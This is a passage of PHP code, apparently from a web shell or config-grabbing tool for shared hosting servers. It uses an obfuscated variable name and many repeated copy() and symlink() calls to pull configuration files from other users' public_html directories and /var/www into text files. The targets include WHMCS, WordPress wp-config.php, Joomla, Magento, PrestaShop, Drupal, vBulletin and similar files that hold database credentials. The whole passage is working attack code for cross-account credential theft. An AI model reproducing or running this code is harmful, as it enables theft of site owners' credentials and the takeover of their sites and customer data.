        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/accounts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/buy/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/checkout/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/central/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clienti/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/client/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/cliente/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientes/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clients/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientarea/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientsarea/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/client-area/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clients-area/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientzone/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/client-zone/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/core/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/company/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/customer/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/customers/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/bill/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/billing/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/finance/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/financeiro/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/host/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/hosts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/hosting/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/hostings/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/klien/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/manage/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/manager/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/member/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/members/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/my/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/myaccount/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/my-account/client/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/myaccounts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/my-accounts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/order/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/orders/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/painel/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/panel/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/panels/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portal/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portals/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/purchase/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/secure/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/support/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/supporte/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/supports/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/web/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/webhost/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/webhosting/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/whm/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/whmcs/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/whmcs2/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/Whm/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/Whmcs/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/WHM/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/WHMCS/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/configuration.php', $IIIIIIIIIlll . '-WHMCS-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/account/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/accounts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/buy/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/checkout/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/central/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clienti/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/client/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/cliente/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientes/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clients/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientarea/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientsarea/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/client-area/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clients-area/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/clientzone/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/client-zone/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/core/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/company/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/customer/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/customers/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/bill/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/billing/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/finance/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/financeiro/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/host/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/hosts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/hosting/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/hostings/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/klien/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/manage/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/manager/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/member/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/members/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/my/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/myaccount/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/my-account/client/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/myaccounts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/my-accounts/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/order/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/orders/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/painel/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/panel/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/panels/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portal/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portals/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/purchase/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/secure/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/support/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/supporte/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/supports/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/web/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/webhost/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/webhosting/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/whm/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/whmcs/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/whmcs2/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/Whm/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/Whmcs/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/WHM/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/WHMCS/configuration.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wp/test/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/blog/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/beta/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portal/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/site/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wp/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/WP/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/news/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wordpress/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/test/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/demo/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/home/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v1/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v2/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/press/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/new/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/blogs/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/blog/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/submitticket.php', $IIIIIIIIIlll . '-WHMCS.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/cms/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/beta/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portal/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/site/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/main/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/home/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/demo/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/test/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v1/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v2/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/joomla/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/new/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/app/etc/local.xml', $IIIIIIIIIlll . '-MAGENTO.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/config/settings.inc.php', $IIIIIIIIIlll . '-PRESTASHOP.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wp/test/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/blog/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/beta/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portal/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/site/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wp/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/WP/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/news/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/wordpress/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/test/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/demo/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/home/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v1/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v2/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/press/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/new/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/blogs/wp-config.php', $IIIIIIIIIlll . '-WORDPRESS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/blog/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/submitticket.php', $IIIIIIIIIlll . '-WHMCS.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/cms/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/beta/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/portal/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/site/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/main/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/home/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/demo/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/test/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v1/configuration.php', $IIIIIIIIIlll . 'JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/v2/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/joomla/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/new/configuration.php', $IIIIIIIIIlll . '-JOOMLA.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/app/etc/local.xml', $IIIIIIIIIlll . '-MAGENTO.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/config/settings.inc.php', $IIIIIIIIIlll . '-PRESTASHOP.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/application/config/database.php', $IIIIIIIIIlll . '-ELLISLAB.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/admin/config.php', $IIIIIIIIIlll . '-OPENCART.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/default/settings.php', $IIIIIIIIIlll . '-DRUPAL.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/forum/config.php', $IIIIIIIIIlll . '-PHPBB.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/application/config/database.php', $IIIIIIIIIlll . '-ELLISLAB.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/admin/config.php', $IIIIIIIIIlll . '-OPENCART.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/default/settings.php', $IIIIIIIIIlll . '-DRUPAL.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/forum/config.php', $IIIIIIIIIlll . '-PHPBB.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/vb/includes/config.php', $IIIIIIIIIlll . '-VBULLETIN.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/includes/config.php', $IIIIIIIIIlll . '-VBULLETIN.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/forum/includes/config.php', $IIIIIIIIIlll . '-VBULLETIN.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_htm/config.php', $IIIIIIIIIlll . '-OTHER.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_htm/html/config.php', $IIIIIIIIIlll . '-PHPNUKE.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/vb/includes/config.php', $IIIIIIIIIlll . '-VBULLETIN.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/includes/config.php', $IIIIIIIIIlll . '-VBULLETIN.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/forum/includes/config.php', $IIIIIIIIIlll . '-VBULLETIN.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_htm/config.php', $IIIIIIIIIlll . '-OTHER.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_htm/html/config.php', $IIIIIIIIIlll . '-PHPNUKE.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_htm/conn.php', $IIIIIIIIIlll . '-OTHER.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/conn.php', $IIIIIIIIIlll . '-OTHER.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/inc/config.inc.php', $IIIIIIIIIlll . '-OTHER.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/application/config/database.php', $IIIIIIIIIlll . '-OTHER.txt');
        symlink('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/application/config/database.php', $IIIIIIIIIlll . '-OTHER.txt');
        copy('/' . $home . '/' . $IIIIIIIIIlll . '/public_html/inc/config.inc.php', $IIIIIIIIIlll . '-OTHER.txt');
        copy('/var/www/wp-config.php', 'WORDPRESS.txt');
        copy('/var/www/configuration.php', 'JOOMLA.txt');
        copy('/var/www/config.inc.php', 'OPENJOURNAL.txt');
        copy('/var/www/config.php', 'OTHER.txt');
        copy('/var/www/config/koneksi.php', 'OTHER.txt');
        copy('/var/www/include/config.php', 'OTHER.txt');
        copy('/var/www/connect.php', 'OTHER.txt');
        copy('/var/www/config/connect.php', 'OTHER.txt');
        copy('/var/www/include/connect.php', 'OTHER.txt');
        copy('/var/www/html/wp-config.php', 'WORDPRESS.txt');
        copy('/var/www/html/configuration.php', 'JOOMLA.txt');
        copy('/var/www/html/config.inc.php', 'OPENJOURNAL.txt');
        copy('/var/www/html/config.php', 'OTHER.txt');
        copy('/var/www/html/config/koneksi.php', 'OTHER.txt');
        copy('/var/www/html/include/config.php', 'OTHER.txt');
        copy('/var/www/html/connect.php', 'OTHER.txt');
        copy('/var/www/html/config/connect.php', 'OTHER.txt');
        copy('/var/www/html/include/connect.php', 'OTHER.txt');
        symlink('/var/www/wp-config.php', 'WORDPRESS.txt');
